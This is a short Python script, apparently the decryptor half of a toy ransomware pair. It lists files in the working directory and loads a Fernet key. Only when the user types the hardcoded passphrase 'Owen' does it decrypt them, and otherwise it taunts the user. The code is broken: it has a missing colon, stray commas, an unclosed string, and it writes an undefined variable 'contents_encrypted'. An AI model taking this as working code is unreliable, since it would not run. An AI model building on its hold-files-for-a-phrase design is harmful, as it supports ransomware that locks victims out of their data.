#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir()
	if file == "EN.py", or file == "thekey.key", or file == "DE.py:
		continue
	if os.path.isfile(file):
		files.append(file)


with open("thekey.key", "rb") as key:
        secretkey = key.read()

secretphrase = "Owen"

user_phrase = input("Enter the phrase\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_encrypted)
		print("I guess ill decrypt them")
else:
	print("Yeah right")
